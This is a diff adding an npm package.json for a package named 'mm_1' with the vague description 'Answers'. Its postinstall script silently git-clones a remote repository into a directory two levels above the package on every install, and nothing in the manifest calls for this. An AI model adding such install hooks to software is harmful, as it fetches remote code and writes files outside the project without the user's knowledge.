@@ -1,0 +1,20 @@
+{
+  "name": "mm_1",
+  "version": "2.0.5",
+  "description": "Answers",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "postinstall": "git clone https://github.com/PeterJohnson2/mm_1.git#2 ./../../git_modules/mm_1"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/PeterJohnson2/mm_1.git"
+  },
+  "author": "Helly",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/PeterJohnson2/mm_1/issues"
+  },
+  "homepage": "https://github.com/PeterJohnson2/mm_1#readme"
+}
